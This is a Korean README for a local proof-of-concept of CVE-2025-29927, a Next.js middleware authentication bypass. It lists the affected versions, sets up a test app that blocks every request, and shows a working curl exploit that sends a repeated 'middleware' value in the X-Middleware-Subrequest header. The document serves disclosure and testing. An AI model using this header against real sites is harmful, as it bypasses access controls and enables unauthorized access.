# CVE-2025-29927

> [Github (@j93es)](https://github.com/j93es)

> [Blog](https://j93.es)

<br/>

## 요약

아래 Nextjs 버전에서 `x-middleware-subrequest`헤더에 특정 값을 추가하여 요청 시, middleware의 인증검사가 우회됩니다.

- \> 11.1.4 < 12.3.5
- \> 14.0 <14.2.25
- \> 15.0 <15.2.3
- \>= 13.0.0, < 13.5.9

<br/>

## PoC 구성

먼저 middleware에서 모든 요청을 403으로 반환합니다.

```ts
// ./src/middleware.ts
export function middleware() {
  return Response.json(
    { success: false, message: "Forbidden" },
    { status: 403 }
  );
}
```

더하여 Admin page를 구성하였습니다.

```ts
// ./src/app/page.tsx
export default function Home() {
  return <h1>Admin Home Page</h1>;
}
```

정상적인 경우라면 middleware의 인증 검사를 거침으로 403이 반환되어야 합니다.

<br/>

## 환경 구성 및 실행

```sh
# 이미지 빌드
make build

# 컨테이너 실행
make up

# 종료
make down

# 로그 보기
make logs

# 컨테이너 재시작
make restart

# 컨테이너 및 이미지 제거 가능
make clean

# 이미지 제거 후 재빌드
make rebuild
```

<br/>

## 결과

### 정상적인 요청

```sh
curl -v http://localhost:8001/
```

![normal](./assets/normal.png)

### 취약한 요청

```sh
curl -v http://localhost:8001/ -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
```

![normal](./assets/vuln.png)

수신된 html 요청의 전문은 `./assets/bypassed.html`에서 확인 가능합니다.

<br/>

## 정리

Nextjs 특정 버전에서 `x-middleware-subrequest`헤더에 특정 값을 추가하여 요청 시, middleware의 인증검사가 우회됩니다. 15.2.2에서는 `X-Middleware-Subrequest`에 `middleware:middleware:middleware:middleware:middleware`로 요청 시에 middleware의 인증검사가 우회됩니다. 따라서 최신 버전의 Nextjs로 업데이트해야합니다.
